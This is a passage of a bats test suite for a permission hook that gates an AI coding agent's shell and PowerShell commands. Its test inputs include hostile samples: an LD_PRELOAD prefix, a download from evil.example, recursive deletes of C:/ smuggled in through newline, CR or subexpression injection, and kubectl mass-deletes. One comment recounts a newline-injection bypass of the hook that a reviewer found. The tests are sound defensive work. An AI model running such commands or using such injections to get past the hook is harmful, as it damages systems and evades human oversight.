ruff        | ruff*              | lint
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
  lint: "python3 -m ruff check src/"
YAML
)"
    run_hook 'pytest tests/test_foo.py' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test wiredcomp"* ]]
    [[ "$output" == *"ws hook-bypass pytest"* ]]
}

@test "adapter-redirect: raw python -m pytest matches the pytest-mod pattern" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*            | test
pytest-mod  | python* -m pytest* | test
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
YAML
)"
    run_hook 'python3 -m pytest tests/' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test wiredcomp"* ]]
}

@test "adapter-redirect: raw ruff in a component WITH commands.lint denies" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
ruff | ruff* | lint
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  lint: "python3 -m ruff check src/"
YAML
)"
    run_hook 'ruff check src/' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws lint wiredcomp"* ]]
}

@test "adapter-redirect: raw pytest in a component WITHOUT an adapter file emits nudge and falls through" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    # Empty adapter content = no adapter file at all.
    seed_adapter_fixture "barecomp" ""
    run_hook 'pytest tests/' "$WORK/components/barecomp"
    [ "$status" -eq 0 ]
    # Falls through — no deny / no allow emitted by Tier 3.
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    # Nudge on stderr — bats `run` merges fd1+fd2, so the message is
    # visible in $output even though it's printed to stderr.
    [[ "$output" == *"No \`ws test\` adapter for barecomp"* ]]
}

@test "adapter-redirect: adapter present but missing commands.<verb> still emits nudge" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
ruff   | ruff*   | lint
EOF
)"
    # Adapter file exists but only has commands.lint (test is missing).
    seed_adapter_fixture "lintonly" "$(cat <<'YAML'
commands:
  lint: "ruff check ."
YAML
)"
    run_hook 'pytest tests/' "$WORK/components/lintonly"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"No \`ws test\` adapter for lintonly"* ]]
}

@test "adapter-redirect: pytest outside any component dir doesn't fire the rule" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    # cwd = $WORK (project root, not inside components/).
    run_hook "pytest tests/" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"No \`ws test\` adapter"* ]]
}

@test "adapter-redirect: pytest at the bare components/ root falls through (no blank-component nudge)" {
    # Pin the _ar_resolve_component edge case: the pattern
    # `"$root/components/"*` also matches `$root/components/` itself
    # (empty tail). Without the empty-segment guard the resolver
    # would emit a nudge for a blank component name and try to look
    # up `adapters/.yaml`. Guard ensures the rule only fires under
    # an actual `components/<comp>/` path.
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    mkdir -p "$WORK/components"
    run_hook "pytest tests/" "$WORK/components"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    # No blank-component nudge: a regression that surfaces `No ws
    # test adapter for ...` (with empty or whitespace-only name)
    # would fail here.
    [[ "$output" != *"No \`ws test\` adapter for "* ]]
}

@test "adapter-redirect: overlapping unwired patterns emit only one nudge" {
    # Two entries whose globs both match `pytest tests/` (same verb,
    # same component). Without the break-on-first-match guard, the
    # unwired branch would emit two nudges and two audit entries for
    # a single invocation. Pin the one-nudge contract here.
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*  | test
pytest-narrow | pytest * | test
EOF
)"
    seed_adapter_fixture "barecomp" ""
    run_hook "pytest tests/" "$WORK/components/barecomp"
    [ "$status" -eq 0 ]
    # Count how many times the nudge phrase appears. Should be 1.
    local nudge_count
    nudge_count="$(printf '%s\n' "$output" | grep -c "No \`ws test\` adapter for barecomp" || true)"
    [ "$nudge_count" -eq 1 ] || { echo "expected 1 nudge, got $nudge_count"; return 1; }
}

@test "adapter-redirect: bypass marker turns wired-deny into allow" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
YAML
)"
    write_bypass_marker "pytest" "session-xyz" "running a single test directly"
    run_hook_with_session "pytest tests/test_one.py::test_x" "session-xyz" "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── scoped-redirect-commands: parse-safety guard ───────────────────

@test "scoped-redirect: section parses without aborting the file (no scope → passthrough)" {
    write_project_hook_rules "$(cat <<'EOF'
[scoped-redirect-commands]
k8s | kubectl* | GDD_K8S_CONTEXT | Use `ws k8s <args>`.
EOF
)"
    run_hook 'kubectl get pods'
    [ "$status" -eq 0 ]
    # No session/scope present → no redirect, and the file must NOT be skipped (no parse warning behavior).
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "redirect: command outside [redirect-commands] passes through Tier 2" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_project_settings "Bash(ls *)"
    run_hook "ls -la"
    [ "$status" -eq 0 ]
    # Settings.json allow at Tier 5 should still match
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Tier 2 redirect — bypass marker ────────────────────────────────

@test "bypass: marker with matching session_id turns deny into allow" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend last commit"
    run_hook_with_session 'git commit --amend -m "fix"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason="amend last commit"' "$HOME/.claude/hook-audit.log"
}

@test "bypass: marker with mismatched session_id still denies" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-stale" "old session"
    run_hook_with_session 'git commit -m "fix"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
}

@test "bypass: marker with empty reason still allows, audit reason is empty" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" ""
    run_hook_with_session 'git commit -m "x"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason=""' "$HOME/.claude/hook-audit.log"
}

@test "bypass: git-commit marker does NOT bypass gh-pr-create deny (slug isolation)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session "gh pr create --title x --body y" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws cr"* ]]
}

@test "bypass: marker does NOT override Tier 1 composition deny" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session 'git commit -m x && git push' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "bypass: marker does NOT override Tier 4 ask-list" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
[ask-commands]
rm -rf*
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session "rm -rf .tmp/anything" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "bypass: empty session_id in payload means no marker can match" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "" "no-id"
    run_hook_with_session "git commit -m x" ""
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    # Security invariant: empty must not match empty. Confirm the deny is
    # the -n guard rejecting the marker, NOT a bypass that silently fired.
    ! grep -q 'BYPASS-ALLOW' "$HOME/.claude/hook-audit.log"
}

@test "bypass: ws hook-bypass <slug> does not match any redirect pattern (pattern-collision invariant)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
[ask-commands]
ws hook-bypass [a-z]*
EOF
)"
    # Each known slug invocation should hit Tier 4 ask, NOT Tier 2 deny.
    for slug in git-commit git-push gh-pr-create; do
        echo "# testing slug: $slug"   # surfaces which iteration failed
        run_hook "ws hook-bypass $slug"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    done
}

@test "bypass: marker is found when cwd is a subdirectory of the project root" {
    # The marker lives at <project-root>/.tmp/hook-bypass/ (where
    # ws hook-bypass writes it). When the agent's cwd is a subdir, the
    # hook must still resolve the marker via the hook-rules root, not a
    # cwd-anchored path. Regression guard for the cwd-anchored lookup bug.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "from subdir"
    mkdir -p "$WORK/components/some-comp"
    run_hook_with_session 'git commit -m x' "session-abc" "$WORK/components/some-comp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason="from subdir"' "$HOME/.claude/hook-audit.log"
}

@test "bypass: malformed marker missing session_id denies without aborting the hook" {
    # A corrupted / hand-edited marker missing the session_id line must
    # NOT abort the hook (grep-fail under set -euo pipefail). It should
    # treat the marker as stale and deny normally.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    mkdir -p "$WORK/.tmp/hook-bypass"
    printf 'slug: git-commit\nreason: hand-edited\n' > "$WORK/.tmp/hook-bypass/git-commit.bypass"
    run_hook_with_session 'git commit -m x' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "bypass: malformed marker missing reason line still allows on session match" {
    # Missing reason line must not abort the hook either; with a matching
    # session_id the bypass still applies, just with an empty reason.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    mkdir -p "$WORK/.tmp/hook-bypass"
    printf 'session_id: session-abc\nslug: git-commit\n' > "$WORK/.tmp/hook-bypass/git-commit.bypass"
    run_hook_with_session 'git commit -m x' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason=""' "$HOME/.claude/hook-audit.log"
}

# ─── ws commit allowlist + bounded attribution prepend ──────────────

# These tests assert the SHIPPED config (real .claude/settings.json +
# .claude/hooks/hook-rules), so each seeds the synthetic project with the
# committed files — the hook can't walk up to the repo from the tmp $WORK.

@test "allow: bare 'ws commit' is allowlisted" {
    seed_real_project_config
    run_hook "ws commit yggdrasil .commits/x.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# Sub-agents attribute commits via `ws commit --co-author-file <name>`, NOT
# an env prefix. The flag carries only a bare file name (no `<email>` angle
# brackets, no env assignment), so it never trips Tier 1 and matches the
# bare `Bash(ws commit:*)` allow directly — no special hook handling needed.
@test "allow: ws commit --co-author-file is allowlisted (matches ws commit:*)" {
    seed_real_project_config
    run_hook 'ws commit --co-author-file sub-agent-xyz yggdrasil .commits/x.md'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ws test / ws lint allowlisted under the realm trust model (design § Adapter
# trust). They run adapter-defined commands; trust is established at realm
# scan/activation (orientation risk-scan) + surfaced by `ws orient`, NOT by
# withholding the allowlist.
@test "allow: ws test is allowlisted" {
    seed_real_project_config
    run_hook "ws test knarr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow: ws lint is allowlisted" {
    seed_real_project_config
    run_hook "ws lint knarr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ws orient / ws audit-permissions are MUST-run session-start commands (the
# orientation contract). Both are read-only and were missing from the shipped
# allowlist, so every fresh session prompted on them. Regression guards.
@test "allow: ws orient is allowlisted" {
    seed_real_project_config
    run_hook "ws orient"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "allow: bash scripts/ws orient is allowlisted" {
    seed_real_project_config
    run_hook "bash scripts/ws orient"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "allow: ws audit-permissions is allowlisted" {
    seed_real_project_config
    run_hook "ws audit-permissions"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# SECURITY: a general env-prefix strip must NOT exist — an arbitrary env
# assignment on an allowlisted command must not silently auto-approve.
@test "security: LD_PRELOAD prefix on an allowlisted command does NOT auto-allow" {
    seed_real_project_config
    run_hook 'LD_PRELOAD=/tmp/evil.so ws status'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# SECURITY: an arbitrary env prefix must not auto-allow a command. There is
# no env-prefix strip anymore (sub-agents use `--co-author-file`), so a
# prefixed command keeps its prefix in the match string and cannot match the
# bare allow globs. A bare `git commit` still denies via the redirect tier
# (covered above); here we only assert the prefixed form never auto-allows.
@test "security: an env prefix on a command does NOT auto-allow" {
    seed_real_project_config
    run_hook 'GDD_CO_AUTHOR="x" git commit -m y'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# ─── PowerShell branch: deny-by-default + bypass ───────────────────
#
# CLAUDE_PROJECT_DIR is pinned to $WORK in the bypass tests so the
# marker lookup resolves inside the sandbox regardless of what the
# ambient environment carries.

@test "powershell: arbitrary command denies with constructive message" {
    run_hook_ps "Get-ChildItem C:/Users -Recurse"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"blocked by default"* ]]
    [[ "$output" == *"ws hook-bypass powershell"* ]]
}

@test "powershell: bare ./test.ps1 routes through ws test" {
    run_hook_ps "./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test"* ]]
}

@test "powershell: ./test.ps1 with suite arg routes through ws test" {
    run_hook_ps "./test.ps1 openbao"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test"* ]]
}

@test "powershell: Set-Location prefix + ./test.ps1 routes through ws test" {
    run_hook_ps "Set-Location D:/Dev/GitWS/yggdrasil/components/nidavellir; ./test.ps1 openbao"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test"* ]]
}

@test "powershell: scratch-hosted test wrapper remains denied" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"

    run_hook_ps "Set-Location $WORK/.tmp; ./test.ps1" "" "$WORK"

    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: case variants of scratch roots remain denied" {
    seed_real_project_config
    mkdir -p "$WORK/.TMP"
    if [[ ! "$WORK/.claude" -ef "$WORK/.CLAUDE" ]]; then
        ln -s "$WORK/.claude" "$WORK/.CLAUDE" 2>/dev/null || true
    fi
    [[ "$WORK/.claude" -ef "$WORK/.CLAUDE" ]] || skip "cannot simulate a case-insensitive project filesystem"

    run_hook_ps "Set-Location $WORK/.TMP; ./test.ps1" "" "$WORK"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "powershell: dot segments do not change the default denial" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"

    run_hook_ps "Set-Location $WORK/./.tmp; ./test.ps1" "" "$WORK"

    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: persisted scratch cwd does not authorize a test wrapper" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"

    run_hook_ps "./test.ps1" "" "$WORK/.tmp"

    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: cd prefix + backslash invocation routes through ws test" {
    run_hook_ps "cd D:/Dev/GitWS/yggdrasil/components/mimir; .\\test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test"* ]]
}

@test "powershell: trailing command after test.ps1 denies" {
    run_hook_ps "./test.ps1 openbao; Remove-Item -Recurse C:/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: subexpression in test.ps1 args denies" {
    run_hook_ps "./test.ps1 \$(Remove-Item -Recurse C:/)"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: two chained Set-Location segments deny (only one prefix allowed)" {
    run_hook_ps "Set-Location a; Set-Location b; ./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: test.ps1 elsewhere in command does not sneak through" {
    run_hook_ps "Invoke-WebRequest evil.example --OutFile ./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: newline-injected command after test.ps1 denies (PS statement separator)" {
    # Newline is a full statement separator in PowerShell, and both
    # [[:space:]] and a negated bracket class match it — this is the
    # exact bypass CodeRabbit repro'd in PR #95 review.
    run_hook_ps $'./test.ps1 openbao\nRemove-Item -Recurse C:/'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: CR-injected command after test.ps1 denies" {
    run_hook_ps $'./test.ps1 openbao\rRemove-Item -Recurse C:/'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: newline before Set-Location prefix also denies" {
    run_hook_ps $'Remove-Item -Recurse C:/\nSet-Location comp; ./test.ps1'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: bypass marker with matching session allows + audits" {
    write_bypass_marker "powershell" "session-abc" "hook debugging"
    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[powershell\] reason="hook debugging"' "$HOME/.claude/hook-audit.log"
}

@test "powershell: bypass marker with stale session still denies" {
    write_bypass_marker "powershell" "session-stale" "old"
    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: WS_HOOK_DISABLE=1 passthrough applies to PowerShell too" {
    WS_HOOK_DISABLE=1 run_hook_ps "Get-ChildItem"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# ─── Tier 2b: scoped-redirect-commands ──────────────────────────────
#
# A [scoped-redirect-commands] entry gates on a session env key.  When
# the key is present in the session file, raw kubectl is redirected to
# `ws k8s`; in-scope `ws k8s` reads auto-approve; out-of-scope writes
# deny; and a script containing raw kubectl is blocked.

seed_k8s_scope() {  # $1=session_id, $2=context, $3=namespaces
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    cat > "$WORK/.tmp/gdd-agent-sessions/$1.env" <<EOF
GDD_K8S_CONTEXT=$2
GDD_K8S_NAMESPACES=$3
EOF
}

@test "k8s floor: a missing shared guard forces a human decision" {
    seed_real_project_config
    write_project_settings 'Bash(kubectl *)'
    local isolated_root="$BATS_TEST_TMPDIR/missing-guard"
    mkdir -p "$isolated_root/.claude/hooks"
    cp "$REPO_ROOT/.claude/hooks/gdd-permission-hook.sh" "$isolated_root/.claude/hooks/gdd-permission-hook.sh"
    HOOK_BIN="$isolated_root/.claude/hooks/gdd-permission-hook.sh"

    run_hook "kubectl delete pods --all"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"guard is unavailable"* ]]
}

@test "k8s floor: a guard evaluation error forces a human decision" {
    seed_real_project_config
    write_project_settings 'Bash(kubectl *)'
    local isolated_root="$BATS_TEST_TMPDIR/broken-guard"
    mkdir -p "$isolated_root/.claude/hooks" "$isolated_root/scripts"
    cp "$REPO_ROOT/.claude/hooks/gdd-permission-hook.sh" "$isolated_root/.claude/hooks/gdd-permission-hook.sh"
    cat > "$isolated_root/scripts/ws-k8s-guard.sh" <<'BASH'
k8s_guard_normalize_command() { printf '%s' "$1"; }
k8s_guard_script_path() { return 1; }
k8s_guard_inline_shell_contains_kubectl() { return 1; }
k8s_guard_evaluate() { return 1; }
BASH
    HOOK_BIN="$isolated_root/.claude/hooks/gdd-permission-hook.sh"

    run_hook "kubectl delete pods --all"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"guard evaluation failed"* ]]
}

@test "scoped-redirect: active non-k8s entry does not abort when k8s floor is disabled" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\ncustom | customctl* | CUSTOM_SCOPE | Use custom wrapper\n')"
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    printf 'CUSTOM_SCOPE=armed\n' > "$WORK/.tmp/gdd-agent-sessions/scoped-custom.env"
    run_hook_with_session 'customctl mutate' "scoped-custom"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use custom wrapper"* ]]
}

@test "scoped-redirect: raw kubectl redirects to ws k8s when scope active" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws k8s"* ]]
}
@test "scoped-redirect: raw kubectl passes through when NO scope" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'kubectl get pods' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}
@test "k8s safety floor: unscoped raw write force-asks before a blanket allow" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    write_project_settings 'Bash(kubectl:*)'
    run_hook_with_session 'kubectl --context shared apply -k overlays/plain' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"No Kubernetes guard scope is active"* ]]
}
@test "k8s safety floor: unscoped ws k8s write force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'ws k8s delete pod foo -n prod' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: reviewed permission audit script with kubectl as data does not ask" {
    # ws-audit-permissions.sh carries "kubectl" in audit PATTERN STRINGS;
    # content-grepping it produced false asks on a read-only tool (hit by
    # a Codex-workspace session via direct script-path invocation).
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    mkdir -p "$WORK/scripts"
    printf '#!/bin/bash\necho "Bash(kubectl:*)|high|blanket kubectl allow"\n' > "$WORK/scripts/ws-audit-permissions.sh"
    run_hook_with_session "bash $WORK/scripts/ws-audit-permissions.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

@test "k8s safety floor: another first-party script containing kubectl still asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    mkdir -p "$WORK/scripts"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/scripts/other.sh"
    run_hook_with_session "bash $WORK/scripts/other.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "k8s safety floor: symlink inside scripts/ keeps the content inspection" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    mkdir -p "$WORK/scripts"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/outside.sh"
    ln -s "$WORK/outside.sh" "$WORK/scripts/ws-linked.sh" 2>/dev/null || true
    if [[ ! -L "$WORK/scripts/ws-linked.sh" ]]; then
        # MSYS ln -s silently copies when symlinks are unavailable — a copy
        # inside scripts/ is legitimately first-party, so nothing to test.
        skip "symlinks unavailable on this platform"
    fi
    run_hook_with_session "bash $WORK/scripts/ws-linked.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "k8s scoped: reviewed permission audit script with kubectl as data is not denied" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    mkdir -p "$WORK/scripts"
    printf '#!/bin/bash\necho "Bash(kubectl:*)|high|blanket kubectl allow"\n' > "$WORK/scripts/ws-audit-permissions.sh"
    run_hook_with_session "bash $WORK/scripts/ws-audit-permissions.sh" "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "k8s safety floor: unscoped script containing kubectl force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/danger.sh"
    run_hook_with_session "bash $WORK/danger.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: the ws dispatcher via bash scripts/ws is not an opaque kubectl script" {
    # The dispatcher mentions kubectl for its `ws k8s` verb; a non-k8s ws
    # command through the pre-PATH `bash scripts/ws` form must not trip the
    # unscoped-script ask (it did — every newcomer ws call prompted).
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    mkdir -p "$WORK/scripts"
    printf '#!/bin/bash\n# k8s verb dispatches to kubectl via the guard\n' > "$WORK/scripts/ws"
    run_hook_with_session "bash scripts/ws review yggdrasil 134" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" != *"Kubernetes"* ]]
}
@test "k8s safety floor: slash-relative script containing kubectl force-asks" {
    # Slash-relative invocation must resolve against cwd for the content
    # scan. Only the two reviewed dispatcher/audit entrypoints are exempt.
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    mkdir -p "$WORK/tools"
    printf '#!/bin/bash\nkubectl run script-test --image=pause -n gdd-practice\n' > "$WORK/tools/direct-danger.sh"
    run_hook_with_session 'tools/direct-danger.sh' "no-scope-sess" "$WORK"
    [ "$status" -eq 0 ]
